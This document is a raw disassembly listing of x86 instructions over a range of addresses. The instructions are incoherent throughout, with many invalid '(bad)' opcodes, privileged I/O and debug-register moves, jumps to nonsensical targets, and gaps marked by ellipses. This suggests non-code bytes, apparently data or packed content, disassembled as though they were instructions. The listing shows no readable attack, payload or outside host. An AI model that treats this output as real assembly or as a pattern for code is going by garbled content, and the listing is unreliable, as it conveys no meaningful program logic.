  41ad7c:	mov    ch,0x2d
  41ad7e:	arpl   WORD PTR gs:[edx],bp
  41ad81:	sub    esp,DWORD PTR [ecx+0x0]
  41ad84:	jae    0x41adeb
  41ad86:	xor    esi,DWORD PTR [esi]
  41ad88:	jae    0x41adef
  41ad8a:	std    
  41ad8b:	ins    BYTE PTR es:[edi],dx
	...
  41adb4:	add    al,al
  41adb6:	xor    eax,0x5b6b6966
  41adbb:	arpl   WORD PTR [ecx+0x1c],sp
  41adbe:	jle    0x41ade8
  41adc0:	jne    0x41adbf
  41adc2:	mov    al,BYTE PTR [ecx]
  41adc4:	or     WORD PTR [ebp-0x58f488d6],dx
  41adcb:	hlt    
  41adcc:	(bad)  
  41adcd:	cld    
  41adce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adcf:	xor    ch,BYTE PTR [eax-0x5]
  41add2:	popf   
  41add3:	sub    BYTE PTR [eax],al
  41add5:	hlt    
  41add6:	shr    BYTE PTR [ecx],cl
  41add8:	pop    edi
  41add9:	(bad)  
  41adda:	rol    BYTE PTR [ecx],cl
  41addc:	jo     0x41ada1
  41adde:	fdiv   DWORD PTR [ecx]
  41ade0:	add    BYTE PTR [esi-0x308ed823],bh
  41ade6:	retf   0x652b
  41ade9:	sbb    al,0xd4
  41adeb:	sub    eax,0x2dd3c45f
  41adf0:	pop    edi
  41adf1:	mov    ah,0x71
  41adf3:	xor    BYTE PTR [edi-0x51],dh
  41adf6:	add    DWORD PTR [ecx],esp
  41adf8:	popa   
  41adf9:	add    DWORD PTR [ebx+0x4],0x38007d6b
  41ae00:	push   0x61040581
  41ae05:	jge    0x41ae0d
  41ae07:	and    DWORD PTR [ebp+edi*2+0x74],esp
  41ae0b:	xor    BYTE PTR [edi-0x80],ah
  41ae0e:	push   ds
  41ae0f:	and    eax,0x2b221c72
  41ae14:	bound  edi,QWORD PTR [ecx+0x42]
  41ae17:	cmp    BYTE PTR [eax],al
	...
  41ae41:	add    BYTE PTR [edx+0x4d],al
  41ae44:	xor    ah,BYTE PTR [ebx+0x4a]
  41ae47:	dec    edi
  41ae48:	xor    al,BYTE PTR [eax]
  41ae4a:	cmp    eax,0x3b662841
  41ae4f:	dec    esp
  41ae50:	add    al,0x72
  41ae52:	cmp    eax,0x40632c51
  41ae57:	je     0x41ae88
  41ae59:	pop    edi
  41ae5a:	xor    eax,0x2b6d1f5e
  41ae5f:	pop    ebx
  41ae60:	out    0x24,eax
  41ae62:	pmuludq mm2,mm2
  41ae65:	and    cl,BYTE PTR [esi]
  41ae67:	pop    ebx
  41ae68:	xlat   BYTE PTR ds:[ebx]
  41ae69:	es jmp 0x41ae58
  41ae6c:	shl    DWORD PTR [edi],cl
  41ae6e:	sbb    al,0xf9
  41ae70:	(bad)  
  41ae71:	aaa    
  41ae72:	pop    es
  41ae73:	cld    
  41ae74:	int3   
  41ae75:	add    edi,ebp
  41ae77:	in     eax,dx
  41ae78:	lds    ebp,FWORD PTR [eax]
  41ae7a:	add    edi,eax
  41ae7c:	out    0x21,al
  41ae7e:	ret    
  41ae7f:	repz xchg edx,eax
  41ae81:	rcr    DWORD PTR es:[edx-0x66],cl
  41ae85:	sub    al,0xbd
  41ae87:	stc    
  41ae88:	mov    esi,DWORD PTR [ecx]
  41ae8a:	sti    
  41ae8b:	pop    edx
  41ae8c:	jl     0x41aeb8
  41ae8e:	mov    ebp,0x1c3a8bf1
  41ae93:	stc    
  41ae94:	(bad)  
  41ae95:	aaa    
  41ae96:	mov    edi,0xb4038bef
  41ae9b:	idiv   DWORD PTR [edx+0x2f]
  41ae9e:	mov    cl,0x2b
  41aea0:	out    0x26,eax
  41aea2:	xchg   esp,esi
  41aea4:	dec    esp
  41aea5:	daa    
	...
  41aece:	add    BYTE PTR [edi+0x75234b5b],al
  41aed4:	out    dx,al
  41aed5:	push   edx
  41aed6:	and    ebx,DWORD PTR [edx+ebp*8]
  41aed9:	inc    edi
  41aeda:	das    
  41aedb:	pop    ebx
  41aedc:	in     eax,dx
  41aedd:	xor    ch,BYTE PTR [ebx+edx*2]
  41aee0:	pop    ebx
  41aee1:	dec    edx
  41aee2:	sub    eax,0x3347eb77
  41aee7:	sbb    al,0xf7
  41aee9:	mov    db0,edi
  41aeec:	out    dx,al
  41aeed:	or     al,0x28
  41aeef:	sbb    al,0xe7
  41aef1:	pop    es
  41aef2:	cmp    edi,DWORD PTR [eax]
  41aef4:	out    dx,al
  41aef5:	sbb    BYTE PTR [edx+edi*1],al
  41aef8:	out    dx,al
  41aef9:	clc    
  41aefa:	ss inc edi
  41aefc:	pop    ebx
  41aefd:	adc    DWORD PTR ds:0xb9ffed44,ebp
  41af03:	scas   al,BYTE PTR es:[edi]
  41af04:	daa    
  41af05:	add    bl,bh
  41af07:	idiv   bl
  41af09:	addr16 enter 0xf74d,0xff
  41af0e:	retf   0xf643
  41af11:	ins    DWORD PTR es:[edi],dx
  41af12:	ret    0x258e
  41af15:	xor    ch,cl
  41af17:	dec    edi
  41af18:	cli    
  41af19:	pop    esi
  41af1a:	retf   0xfa47
  41af1d:	jo     0x41af08
  41af1f:	cmp    al,0xf0
  41af21:	ins    BYTE PTR es:[edi],dx
  41af22:	lds    ebx,FWORD PTR [edi]
  41af24:	cmc    
  41af25:	imul   edi,DWORD PTR [esi-0x168e05d8],0xc
  41af2c:	cld    
  41af2d:	ins    BYTE PTR es:[edi],dx
  41af2e:	mov    cs,WORD PTR [ebx]
  41af30:	cli    
  41af31:	jno    0x41af1c
	...
  41af5b:	add    ch,bh
  41af5d:	std    
  41af5e:	ins    DWORD PTR es:[edi],dx
  41af5f:	mov    cl,dh
  41af61:	std    
  41af62:	call   DWORD PTR [edx+0x7a62f1fe]
  41af68:	pop    ds
  41af69:	(bad)  
  41af6a:	jo     0x41aef9
  41af6c:	add    esi,edi
  41af6e:	jo     0x41aef5
  41af70:	stc    
  41af71:	pop    edx
  41af72:	jbe    0x41afc4
  41af74:	inc    ebx
  41af75:	out    0x6c,eax
  41af77:	pop    ebx
  41af78:	push   ecx
  41af79:	pop    ebx
  41af7a:	ins    BYTE PTR es:[edi],dx
  41af7b:	inc    esi
  41af7c:	imul   DWORD PTR ss:[edi+edi*1+0x18]
  41af81:	sub    al,0x32
  41af83:	cli    
  41af84:	xor    dh,ah
  41af86:	(bad)  
  41af87:	jmp    0xfa72da74
  41af8c:	icebp  
  41af8d:	sub    eax,0xfc2c3a00
  41af92:	jno    0x41afb1
  41af94:	adc    bh,al
  41af96:	push   0x6cf7fee9
  41af9b:	sbb    edi,edi
  41af9d:	idiv   edi
  41af9f:	adc    eax,0x6decf1
  41afa4:	sub    BYTE PTR ds:0x38246d00,ah
  41afaa:	arpl   WORD PTR [ecx+0x18],bp
  41afad:	push   edi
  41afae:	je     0x41b022
  41afb0:	sbb    al,0x31
  41afb2:	gs je  0x41b031
  41afb5:	pop    eax
  41afb6:	imul   ebp,DWORD PTR [esi+0x61],0x2f
  41afba:	outs   dx,BYTE PTR ds:[esi]
  41afbb:	gs jne 0x41b025
  41afbe:	das    
  41afbf:	xor    eax,DWORD PTR [eax]
	...
  41afe9:	push   esp
  41afea:	ss pop edi
  41afec:	add    BYTE PTR [esi+0x30],ah
  41afef:	arpl   WORD PTR gs:[esi+0x3b],cx
  41aff3:	outs   dx,BYTE PTR ds:[esi]
  41aff4:	add    BYTE PTR [edi+0x2b],bl
  41aff7:	outs   dx,BYTE PTR ds:[esi]
  41aff8:	imul   esp,DWORD PTR [edx-0x529cffda],0x45736526
  41b002:	sub    BYTE PTR [ebp+0x73],bl
  41b005:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b006:	sub    DWORD PTR [eax],esi
  41b008:	jb     0x41afa3
  41b00a:	pop    eax
  41b00b:	pop    ebp
  41b00c:	jne    0x41afc4
  41b00e:	sub    esp,DWORD PTR [ebp+0x6e]
  41b011:	inc    ebp
  41b012:	and    eax,0x2ca76170
  41b017:	jne    0x41b019
  41b019:	xchg   esp,eax
  41b01a:	cmp    al,0x69
  41b01c:	imul   esi,DWORD PTR [ebx+0x57],0x33776569
  41b023:	outs   dx,BYTE PTR gs:[esi]
  41b025:	cmc    
  41b026:	cmp    BYTE PTR [ebx+0x6f],ch
  41b029:	pop    edx
  41b02a:	xor    esp,DWORD PTR [ecx+0x0]
  41b02d:	imul   esp,DWORD PTR ds:0x3b636565,0x6f
  41b034:	add    BYTE PTR [ebp+0x30],bl
  41b037:	jo     0x41b09e
  41b039:	cmc    
  41b03a:	and    al,0x68
  41b03c:	popa   
  41b03d:	xor    DWORD PTR [eax],esi
  41b03f:	imul   eax,DWORD PTR [eax],0x746e2e23
  41b045:	sbb    al,0x4f
  41b047:	sub    ah,BYTE PTR [ebx+esi*1+0x72]
  41b04b:	and    eax,0x6d
	...
  41b074:	add    BYTE PTR [eax],al
  41b076:	dec    ebx
  41b077:	dec    ecx
  41b078:	sub    ebp,DWORD PTR [esi+0x3b]
  41b07b:	jb     0x41b0a6
  41b07d:	pop    edi
  41b07e:	cs push esi
  41b080:	pop    ds
  41b081:	ja     0x41b09f
  41b083:	popa   
  41b084:	sub    BYTE PTR [ebp+0x7],ch
  41b087:	(bad)  
  41b088:	cmp    al,0x0
  41b08a:	dec    ebx
  41b08b:	inc    ebp
  41b08c:	icebp  
  41b08d:	xor    al,0x1c
  41b08f:	cwde   
  41b090:	sub    dh,BYTE PTR [ecx-0x7]
  41b093:	sub    DWORD PTR [ecx],0x269f0800
  41b099:	imul   esi,ebp,0x3671d71
  41b09f:	fwait
  41b0a0:	sub    eax,0x2471f05f
  41b0a5:	add    al,dl
  41b0a7:	leave  
  41b0a8:	xor    BYTE PTR [esi-0x48],ch
  41b0ab:	(bad)  
  41b0ac:	xor    eax,DWORD PTR [eax]
  41b0ae:	iret   
  41b0af:	shr    DWORD PTR [edx+esi*2],0xb5
  41b0b3:	lds    eax,FWORD PTR [ecx]
  41b0b5:	bound  edi,QWORD PTR [ebp-0x5798e23d]
  41b0bb:	jno    0x41b0dd
  41b0bd:	outs   dx,BYTE PTR ds:[esi]
  41b0be:	mov    al,0xce
  41b0c0:	xor    eax,DWORD PTR [eax]
  41b0c2:	mov    ebp,0x8b682cdb
  41b0c7:	mov    dl,0x39
  41b0c9:	add    BYTE PTR [edi-0x57],bh
  41b0cc:	ss jbe 0x41b050
  41b0cf:	mov    eax,0x9c1c6330
  41b0d4:	daa    
  41b0d5:	popa   
  41b0d6:	xchg   DWORD PTR [edi+0x39],esp
	...
  41b100:	add    BYTE PTR [eax],al
  41b102:	add    BYTE PTR [ecx+ebp*4+0x2f],ch
  41b106:	arpl   WORD PTR [esi+0x44],bp
  41b109:	and    esp,DWORD PTR [ebx+0x72]
  41b10c:	sahf   
  41b10d:	and    DWORD PTR [ebx+0x45],ebp
  41b110:	pop    ebx
  41b111:	adc    eax,0xec73b04
  41b116:	xor    bh,BYTE PTR [edi]
  41b118:	aam    0x6
  41b11a:	das    
  41b11b:	and    ebx,DWORD PTR [ebx-0x28]
  41b11e:	xor    ch,dh
  41b120:	sar    DWORD PTR [edx+0x10d11c1e],1
  41b126:	xor    al,0x3f
  41b128:	int    0xe7
  41b12a:	and    BYTE PTR [edi],bh
  41b12c:	leave  
  41b12d:	add    al,0x35
  41b12f:	add    ecx,esi
  41b131:	out    0x2c,eax
  41b133:	add    al,ah
  41b135:	(bad)  
  41b136:	sub    edx,DWORD PTR [eax]
  41b138:	pop    ebx
  41b139:	fdiv   DWORD PTR [eax]
  41b13b:	dec    esp
  41b13d:	sar    DWORD PTR [edx],cl
  41b13f:	dec    ebx
  41b140:	pop    ebx
  41b141:	retf   0xff35
  41b144:	mov    ebx,0xbff22ab3
  41b149:	out    0x21,eax
  41b14b:	icebp  
  41b14c:	leave  
  41b14d:	leave  
  41b14e:	and    cl,dh
  41b150:	pop    edx
  41b151:	mov    BYTE PTR [edi],bl
  41b153:	mov    ebx,0x1c3488be
  41b158:	int    0x86
  41b15a:	das    
  41b15b:	mov    ebx,0xad0380c7
  41b160:	(bad)  
  41b161:	mov    BYTE PTR [edx],bh
  41b163:	mov    edi,0x30e7cc
	...
  41b190:	ret    
  41b191:	int    0x8b
  41b193:	sub    BYTE PTR [edi+0x7b35775a],dh
  41b199:	les    ebx,FWORD PTR [edx+0x1f]
  41b19c:	sbb    al,0xd5
  41b19e:	pop    edi
  41b19f:	and    eax,0x2745bd92
  41b1a4:	sbb    al,0xce
  41b1a6:	dec    eax
  41b1a7:	daa    
  41b1a8:	outs   dx,DWORD PTR ds:[esi]
  41b1a9:	rcl    BYTE PTR [ebx+0x4],0x87
  41b1ad:	les    edx,FWORD PTR [edx+0x1f]
  41b1b0:	sbb    al,0xbf
  41b1b2:	add    BYTE PTR [eax+0x34],cl
  41b1b5:	(bad)  
  41b1b6:	pop    edi
  41b1b7:	cmp    ah,BYTE PTR [eax]
  41b1b9:	shl    BYTE PTR [edx+0xc],0x33
  41b1bd:	leave  
  41b1be:	add    BYTE PTR ds:0x1d74cc2b,dl
  41b1c4:	and    ecx,esp
  41b1c6:	je     0x41b1b1
  41b1c8:	add    bh,BYTE PTR [edx-0x3e15f38a]
  41b1ce:	popa   
  41b1cf:	adc    ah,BYTE PTR [eax]
  41b1d1:	enter  0xc6e,0xf4
  41b1d5:	(bad)  
  41b1d6:	jbe    0x41b1dc
  41b1d8:	and    BYTE PTR [edi-0x40b920a1],bh
  41b1de:	add    ah,cl
  41b1e0:	inc    esi
  41b1e1:	(bad)  
  41b1e2:	ins    DWORD PTR es:[edi],dx
  41b1e3:	fbld   TBYTE PTR [edx]
  41b1e5:	pop    ebx
  41b1e6:	popa   
  41b1e7:	ror    DWORD PTR [edx-0x33],0x61
  41b1eb:	rcr    DWORD PTR [edi],1
  41b1ed:	shl    DWORD PTR [edx-0x30],0xa
  41b1f1:	leave  
  41b1f2:	fs jmp 0x41b1f8
	...
  41b21c:	add    BYTE PTR [eax+ecx*8],bh
  41b21f:	fs jmp 0x9db37060
  41b225:	push   es
  41b226:	leave  
  41b227:	ja     0x41b212
  41b229:	cmc    
  41b22a:	(bad)  
  41b22b:	outs   dx,BYTE PTR ds:[esi]
  41b22c:	mov    WORD PTR [edi],ds
  41b22e:	(bad)  
  41b22f:	addr16 mov dh,cl
  41b232:	(bad)  
  41b233:	jno    0x41b1cb
  41b235:	std    
  41b236:	into   
  41b237:	add    BYTE PTR [ebx-0x44cd74cf],bh
  41b23d:	sub    DWORD PTR [ecx+0x5f],ebx
  41b240:	je     0x41b283
  41b242:	mov    ebp,0x5b4f4c6c
  41b247:	das    
  41b248:	sbb    BYTE PTR [ecx],dl
  41b24a:	mov    ch,BYTE PTR [edi]
  41b24c:	sbb    BYTE PTR [ecx],cl
  41b24e:	mov    al,BYTE PTR [eax]
  41b250:	dec    edx
  41b251:	inc    ebx
  41b252:	mov    edx,0x8066005f
  41b257:	ins    BYTE PTR es:[edi],dx
  41b258:	popa   
  41b259:	cmc    
  41b25a:	sub    BYTE PTR [ebx+0x72],0x51
  41b25e:	jle    0x41b2ce
  41b260:	xor    dl,dh
  41b262:	pop    esp
  41b263:	gs ins BYTE PTR es:[edi],dx
  41b265:	sub    cl,BYTE PTR [ecx+0x7b1a6761]
  41b26b:	add    BYTE PTR [esi+0x1a],ah
  41b26e:	xor    BYTE PTR [edx+eiz*2+0x24],0x83
  41b273:	ins    BYTE PTR es:[edi],dx
  41b274:	xor    ebp,eax
  41b276:	sub    BYTE PTR [ebx+0x76],0xc
  41b27a:	and    DWORD PTR [ebx+0x0],0x68747e1b
	...
  41b2a9:	add    BYTE PTR [ecx+eax*4],ah
  41b2ac:	add    BYTE PTR [ebp+0x68],ah
  41b2af:	sbb    DWORD PTR [ebp+0x6e],0x70
  41b2b3:	jnp    0x41b321
  41b2b5:	add    BYTE PTR [esi+0x7d],ah
  41b2b8:	imul   ebp,DWORD PTR [edi+0x67],0xffffff97
  41b2bc:	add    BYTE PTR [esi-0x50],ah
  41b2bf:	jge    0x41b328
  41b2c1:	outs   dx,DWORD PTR ds:[esi]
  41b2c2:	arpl   WORD PTR [esi+0x0],si
  41b2c5:	jae    0x41b31b
  41b2c7:	sub    DWORD PTR [ecx+0x79],0x45
  41b2cb:	sbb    DWORD PTR [ebp+0x78],0xffffffb2
  41b2cf:	jnp    0x41b33d
  41b2d1:	ins    BYTE PTR es:[edi],dx
  41b2d2:	xor    eax,0x9a735d82
  41b2d7:	jle    0x41b2d9
  41b2d9:	push   0xffffffba
  41b2db:	sub    DWORD PTR [esi+0x0],0x74
  41b2df:	(bad)  
  41b2e0:	xor    dh,BYTE PTR [edi+0x66]
  41b2e3:	jnp    0x41b319
  41b2e5:	jb     0x41b31c
  41b2e7:	jp     0x41b346
  41b2e9:	bound  ecx,QWORD PTR [esp+ebx*2+0x4e616572]
  41b2f0:	das    
  41b2f1:	xor    esi,ebp
  41b2f3:	jns    0x41b361
  41b2f5:	popa   
  41b2f6:	sbb    al,0xa4
  41b2f8:	sub    BYTE PTR [edi+0x1c],bl
  41b2fb:	mov    dl,0x32
  41b2fd:	and    BYTE PTR [di+0x1f],0x6d
  41b303:	xchg   ecx,eax
  41b304:	pop    ds
  41b305:	jb     0x41b36f
  41b307:	inc    edx
  41b308:	and    ch,BYTE PTR [eax+0x41]
  41b30b:	xchg   esi,eax
  41b30c:	xor    DWORD PTR [ebx+0x0],esp
	...
  41b337:	cmp    eax,0x1132f042
  41b33c:	das    
  41b33d:	lock (bad) 
  41b33f:	cmp    al,0x60
  41b341:	sbb    eax,0x1334863
  41b346:	push   0x611d543d
  41b34b:	cmp    edx,DWORD PTR [eax+eiz*1+0x0]
  41b34f:	cmp    BYTE PTR [edi+0x3c],ah
  41b352:	je     0x41b355
  41b354:	push   esp
  41b355:	add    DWORD PTR [ecx-0x3],esi
  41b358:	aaa    
  41b359:	and    BYTE PTR [esp+ebx*1+0x73],ah
  41b35d:	repz xor DWORD PTR [esi+0x75],ecx
  41b361:	icebp  
  41b362:	inc    DWORD PTR [ebx]
  41b364:	and    esp,DWORD PTR ds:0x2742036c
  41b36a:	pop    edi
  41b36b:	out    dx,eax
  41b36c:	adc    DWORD PTR [eax],esp
  41b36e:	jb     0x41b38c
  41b370:	es and al,0x6e
  41b373:	lds    ebx,FWORD PTR [esi]
  41b375:	and    eax,0x2a41b96c
  41b37a:	addr16 shr ch,1
  41b37d:	pop    ds
  41b37e:	outs   dx,BYTE PTR ds:[esi]
  41b37f:	sbb    al,0xe5
  41b381:	and    esi,DWORD PTR [ecx-0x51]
  41b384:	ficomp DWORD PTR [edi]
  41b386:	add    BYTE PTR [edi-0x4793df2b],ch
  41b38c:	loop   0x41b38e
  41b38e:	jo     0x41b33e
  41b390:	loop   0x41b3cd
  41b392:	arpl   WORD PTR [esi-0x7792d6bc],cx
  41b398:	pop    ebx
  41b399:	dec    ebx
  41b39a:	and    eax,0x0
	...
  41b3c3:	add    BYTE PTR [ecx+0x722b565b],al
  41b3c9:	mov    edi,0x5b6d2d46
  41b3ce:	cmp    al,0x2f
  41b3d0:	ins    DWORD PTR es:[edi],dx
  41b3d1:	iret   
  41b3d2:	dec    ebx
  41b3d3:	sub    edi,DWORD PTR [edi+0x5b]
  41b3d6:	inc    esi
  41b3d7:	and    ebp,DWORD PTR [eax-0x40]
  41b3da:	cmp    al,BYTE PTR [esi+edi*1]
  41b3dd:	les    edi,FWORD PTR [ebx]
  41b3df:	sub    BYTE PTR [ecx],bh
  41b3e1:	mov    esp,0x5b4d1f1b
  41b3e6:	push   es
  41b3e7:	sub    al,0x3e
  41b3e9:	mov    edi,0xbe1c261b
  41b3ee:	add    eax,0x14c2462c
  41b3f3:	add    al,0xfb
  41b3f5:	mov    BYTE PTR [edx-0x41731111],bh
  41b3fb:	sti    
  41b3fc:	push   edx
  41b3fd:	mov    esp,edi
  41b3ff:	add    edi,edi
  41b401:	into   
  41b402:	loop   0x41b435
  41b404:	adc    al,dl
  41b406:	into   
  41b407:	xor    edx,esi
  41b409:	int    0xdc
  41b40b:	add    eax,DWORD PTR [edi+ecx*8]
  41b40e:	shl    DWORD PTR [ebx],cl
  41b410:	xchg   BYTE PTR ss:[esi],dl
  41b413:	repnz cmp edx,ecx
  41b416:	enter  0xf831,0xc3
  41b41a:	lds    ebp,FWORD PTR [edx]
  41b41c:	sti    
  41b41d:	mov    edi,0xc8c133af
  41b422:	fwait
  41b423:	in     eax,0xbc
  41b425:	lds    ecx,FWORD PTR [esp+eiz*8+0x0]
	...
  41b450:	add    BYTE PTR [ecx-0x38d1663b],bh
  41b456:	test   DWORD PTR [ebp+0x7bcdbf2a],edx
  41b45c:	and    al,0xac
  41b45e:	ret    
  41b45f:	mov    ah,ch
  41b461:	mov    bl,0xc2
  41b463:	add    BYTE PTR [ecx+0x1f],bh
  41b466:	ret    
  41b467:	je     0x41b4de
  41b469:	dec    edi
  41b46a:	xchg   ecx,eax
  41b46b:	sub    eax,0x63880e16
  41b470:	dec    edi
  41b471:	inc    esi
  41b472:	enter  0x4866,0x4a
  41b476:	mov    dh,0x74
  41b478:	dec    eax
  41b479:	cli    
  41b47a:	mov    edx,0xc001546d
  41b47f:	ins    DWORD PTR es:[edi],dx
  41b480:	cmp    esi,DWORD PTR [ebx]
  41b482:	ret    0x3f2d
  41b485:	pop    es
  41b486:	mov    edx,0xcaf93575
  41b48b:	addr16 or al,dl
  41b48e:	lds    ebp,FWORD PTR [eax+0x19]
  41b491:	sbb    BYTE PTR [ebx+0x68],bl
  41b494:	sbb    eax,0xbe3acaec
  41b499:	mov    eax,0xfefb5fc2
  41b49e:	shl    DWORD PTR [ebx+0xd],0xff
  41b4a2:	mov    esi,0xba82075f
  41b4a7:	ins    DWORD PTR es:[edi],dx
  41b4a8:	cld    
  41b4a9:	js     0x41b44c
  41b4ab:	inc    ebx
  41b4ac:	scas   eax,DWORD PTR es:[edi]
  41b4ad:	fcmove st,st(4)
  41b4af:	data16 mov db2,ebx
  41b4b3:	arpl   cx,bp
	...
  41b4dd:	add    BYTE PTR [edi-0x31],al
  41b4e0:	je     0x41b4bb
  41b4e2:	jne    0x41b46a
  41b4e4:	sub    eax,0x2ecb3bcf
  41b4e9:	retf   0xcc38
  41b4ec:	imul   ecx,esp,0xb
  41b4ef:	mov    esi,0xc70fff78
  41b4f4:	sub    eax,0x37a3468e
  41b4f9:	fcmovu st,st(1)
  41b4fb:	mov    eax,0xd31ac772
  41b500:	arpl   cx,bp
  41b502:	pop    es
  41b503:	iret   
  41b504:	je     0x41b506
  41b506:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b507:	push   ebx
  41b508:	sub    al,0x2f
  41b50a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b50b:	jle    0x41b581
  41b50d:	popa   
  41b50e:	xchg   edi,eax
  41b50f:	xchg   ecx,eax
  41b510:	jo     0x41b573
  41b512:	xchg   ebx,eax
  41b513:	xor    DWORD PTR [eax+0x61],0x64657a69
  41b51a:	imul   edi,DWORD PTR [eax+0x73],0x6b7c236e
  41b521:	ins    DWORD PTR es:[edi],dx
  41b522:	repnz mov eax,ds:0xae5f3038
  41b528:	xor    ebp,DWORD PTR [esi]
  41b52a:	pop    eax
  41b52b:	xchg   DWORD PTR [ecx+0x0],esp
  41b52e:	lds    esp,FWORD PTR [edi-0x4fcab6af]
  41b534:	inc    esp
  41b535:	inc    esi
  41b536:	or     al,0x9b
  41b538:	inc    ecx
  41b539:	xor    BYTE PTR [edx+esi*4+0x45],bl
  41b53d:	push   eax
  41b53e:	(bad)  
  41b53f:	mov    ds:0x4946,al
	...
  41b568:	add    BYTE PTR [eax],al
  41b56a:	add    BYTE PTR [ecx],dl
  41b56c:	mov    ds:0x96085930,al
  41b571:	aas    
  41b572:	push   edx
  41b573:	cld    
  41b574:	scas   al,BYTE PTR es:[edi]
  41b575:	push   esp
  41b576:	inc    ebp
  41b577:	dec    ecx
  41b578:	dec    edi
  41b579:	push   esi
  41b57a:	push   ebp
  41b57b:	cmp    al,0x4e
  41b57d:	sub    esi,DWORD PTR [eax]
  41b57f:	jne    0x41b5d9
  41b581:	add    BYTE PTR [eax],al
  41b583:	jne    0x41b5e3
  41b585:	add    BYTE PTR [ebp-0x3e],cl
  41b588:	pushf  
  41b589:	push   ecx
  41b58a:	add    DWORD PTR [eax+ebx*2+0x58750000],eax
  41b591:	add    BYTE PTR [eax],al
  41b593:	jne    0x41b542
  41b595:	dec    ebx
  41b596:	inc    esi
  41b597:	mov    ecx,0x78523db1
  41b59c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b59d:	dec    ecx
  41b59e:	imul   edx,DWORD PTR [esi-0x6d8c9472],0x1c5c7482
  41b5a8:	adc    eax,0xd4b86e1c
  41b5ad:	cmp    dh,BYTE PTR [ecx-0x38]
  41b5b0:	add    BYTE PTR [eax],bh
  41b5b2:	jb     0x41b562
  41b5b4:	ficomp WORD PTR [esi]
  41b5b6:	je     0x41b62a
  41b5b8:	out    0x32,eax
  41b5ba:	jno    0x41b541
  41b5bc:	aad    0x1f
  41b5be:	pop    esp
  41b5bf:	jno    0x41b56d
  41b5c1:	sbb    ebp,DWORD PTR [esi-0x71]
  41b5c4:	scas   al,BYTE PTR es:[edi]
  41b5c5:	and    ebp,DWORD PTR [eax+ecx*4+0x42]
  41b5c9:	pop    eax
  41b5ca:	outs   dx,BYTE PTR ds:[esi]
  41b5cb:	test   DWORD PTR [ebp+esi*1+0x74],edx
	...
  41b5f6:	add    BYTE PTR [eax],al
  41b5f8:	jge    0x41b5a8
  41b5fa:	and    BYTE PTR [ecx+0x68],dl
  41b5fd:	nop
  41b5fe:	sbb    ebp,DWORD PTR [esi+0x43]
  41b601:	inc    edx
  41b602:	inc    ebp
  41b603:	addr16 dec edi
  41b605:	xchg   edx,eax
  41b606:	and    BYTE PTR [edi+0x45],bl
  41b609:	mov    WORD PTR [ebx],fs
  41b60b:	imul   edi,DWORD PTR [ecx],0x42
  41b60e:	dec    ebp
  41b60f:	add    BYTE PTR [edx+eax*2],bl
  41b612:	add    DWORD PTR [eax],eax
  41b614:	sbb    al,0x42
  41b616:	add    DWORD PTR [eax],eax
  41b618:	cli    
  41b619:	data16 sub al,0x63
  41b61c:	sbb    al,0x71
  41b61e:	and    DWORD PTR [esi+0x10],esp
  41b621:	push   ebp
  41b622:	and    al,0x72
  41b624:	stc    
  41b625:	gs pop ecx
  41b627:	addr16 cli 
  41b629:	cmove  edx,DWORD PTR [edx+0x1c]
  41b62d:	and    eax,0x420a6331
  41b632:	add    al,0x0
  41b634:	sbb    al,0xc2
  41b636:	push   ds
  41b637:	arpl   si,bp
  41b639:	sub    ebp,DWORD PTR [eax]
  41b63b:	ins    BYTE PTR es:[edi],dx
  41b63c:	das    
  41b63d:	push   eax
  41b63e:	fbld   TBYTE PTR [ebx-0x38]
  41b641:	sbb    eax,0xf0e85501
  41b646:	dec    ecx
  41b647:	arpl   ax,dx
  41b649:	pop    edx
  41b64a:	test   al,0x26
  41b64c:	enter  0x95c1,0x28
  41b650:	ffree  st(3)
  41b652:	test   DWORD PTR [esi],esi
  41b654:	rol    esi,0x84
  41b657:	push   esi
  41b658:	mov    edi,0x1c7ac7
	...
  41b685:	mov    cl,0xc4
  41b687:	mov    al,0x27
  41b689:	sbb    al,0xab
  41b68b:	jns    0x41b6af
  41b68d:	jge    0x41b647
  41b68f:	jp     0x41b6c7
  41b691:	arpl   WORD PTR [edi-0x4792dec5],si
  41b697:	pop    edx
  41b698:	xor    eax,0x3b45c283
  41b69d:	js     0x41b6fa
  41b69f:	out    0x21,eax
  41b6a1:	jg     0x41b66a
  41b6a3:	dec    eax
  41b6a4:	xor    al,0x7b
  41b6a6:	mov    ?,ecx
  41b6a8:	loope  0x41b6e9
  41b6aa:	mov    edi,0xb8620443
  41b6af:	xor    eax,DWORD PTR [ebx+0x4c]
  41b6b2:	les    ebp,FWORD PTR [ecx]
  41b6b4:	aaa    
  41b6b5:	cmp    bh,BYTE PTR [ecx-0x329dc9fc]
  41b6bb:	or     al,0x27
  41b6bd:	sbb    al,0xa1
  41b6bf:	add    al,0x38
  41b6c1:	dec    edi
  41b6c2:	into   
  41b6c3:	or     al,0x36
  41b6c5:	pop    edi
  41b6c6:	shl    esp,0x1e
  41b6c9:	sbb    al,0x5b
  41b6cb:	push   es
  41b6cc:	and    bh,bh
  41b6ce:	lea    edi,[ecx-0x2c41001f]
  41b6d4:	add    ebp,ebp
  41b6d6:	mov    dh,0x40
  41b6d9:	in     al,dx
  41b6da:	mov    bh,0xc5
  41b6dc:	push   esp
  41b6dd:	call   0x16490a3
  41b6e2:	mov    eax,0xb6c303e7
  41b6e7:	mov    ch,0x22
	...
  41b711:	add    ah,cl
  41b713:	ret    
  41b714:	add    dl,bh
  41b716:	dec    ecx
  41b717:	and    BYTE PTR [ebp+edi*4+0x2b],0x5b
  41b71c:	aas    
  41b71d:	xchg   ebp,eax
  41b71e:	and    eax,eax
  41b720:	popa   
  41b721:	mov    bl,dh
  41b723:	mov    ebp,0x99fb873f
  41b728:	outs   dx,BYTE PTR ds:[esi]
  41b729:	xor    bl,0xb9
  41b72c:	pop    edi
  41b72d:	xchg   ebp,eax
  41b72e:	push   es
  41b72f:	aad    0x63
  41b731:	call   0xbe37:0xaa00b736
  41b738:	popa   
  41b739:	xor    BYTE PTR [ebx-0x40],0x69
  41b73d:	dec    esp
  41b73e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b740:	arpl   WORD PTR [edx+eax*2-0x42],cx
  41b744:	jb     0x41b7a0
  41b746:	adc    BYTE PTR [edx-0x32aa1690],bh
  41b74c:	arpl   WORD PTR [ecx+ecx*2-0x46],cx
